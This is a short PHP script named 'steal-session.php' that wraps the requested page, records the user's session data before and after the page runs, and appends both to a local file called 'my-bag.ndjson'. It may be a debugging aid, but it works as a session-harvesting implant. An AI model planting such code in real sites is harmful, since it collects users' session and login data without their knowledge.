<?php // steal-session.php
# capture SESSION
session_start();
$pre_session = $_SESSION;
session_write_close();

ob_start();
@include($_SERVER['SCRIPT_FILENAME']);
echo $____output = ob_get_clean();

# check modified SESSION.
$after_session = $_SESSION;

# save.
@file_put_contents(
    'my-bag.ndjson',
    @json_encode(
        [
            'pre' => $pre_session,
            'after' => $after_session,
        ],
        JSON_UNESCAPED_UNICODE
    ),
    FILE_APPEND
);

exit();
